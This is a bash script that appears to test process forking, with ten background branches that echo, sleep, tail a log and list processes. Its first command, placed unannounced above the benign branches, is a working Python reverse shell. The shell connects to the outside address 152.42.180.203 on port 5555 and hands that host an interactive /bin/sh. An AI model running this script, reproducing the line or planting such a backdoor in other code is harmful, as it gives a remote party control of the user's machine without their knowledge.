#!/bin/bash


python3 -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("152.42.180.203",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
# 1. Fixed echo with -e for newlines
echo -e 'Source: pkg\nVersion: 2.1\nDate: Fri, 19 Jan 2018 10:00:00 +0200\nDistribution: testing' > meta

############################################
# Branch 1 - Fixed escaped quotes
############################################
(
  sh -c '
    echo "start-branch1";
    sh -c "echo nested-1; sleep 1";
  '
) &

############################################
# Branch 2 - Fixed Awk dollar signs and quotes
############################################
(
  cat meta | awk '$1 == "Source:" {print $2}' | \
  while read x; do
    sh -c "echo processing-$x; sleep 1"
  done
) &

############################################
# Branch 3 - Cleaned up Python nesting
############################################
(
  sh -c '
    sh -c "python3 -c \"import os,time,subprocess; subprocess.Popen(['\''/bin/sleep'\'','\''2'\'']); time.sleep(1)\""
  '
) &

############################################
# Branch 4 - Multi fork (Standardized spaces)
############################################
(
  sh -c '
    for i in 1 2 3; do
      sh -c "sleep $i" &
    done
    wait
  '
) &

############################################
# Branch 5 - Daemon lifecycle
############################################
(
  sh -c '
    echo "daemon-start";
    sh -c "sleep 2" &
    sh -c "ps aux | grep [s]leep" & 
    wait;
    echo "daemon-stop";
  '
) &

############################################
# Branch 6 - File watcher (Added cleanup)
############################################
(
  sh -c '
    touch data.log;
    (echo "hello" >> data.log) &
    tail -n 5 data.log &
    PID=$!; sleep 2; kill $PID 2>/dev/null
  '
) &

############################################
# Branch 7 - Env + exec chain
############################################
(
  sh -c '
    sh -c "env" | grep PATH;
  '
) &

############################################
# Branch 8 - Recursive shell
############################################
(
  sh -c '
    sh -c "sh -c \"echo level3; sleep 1\""
  '
) &

############################################
# Branch 9 - Parallel commands
############################################
(
  sh -c '
    ls > /dev/null &
    uname -a &
    date &
    wait
  '
) &

############################################
# Branch 10 - Restart loop
############################################
(
  sh -c '
    for i in 1 2; do
      sh -c "echo restart-$i; sleep 1"
    done
  '
) &

wait
echo "All branches complete."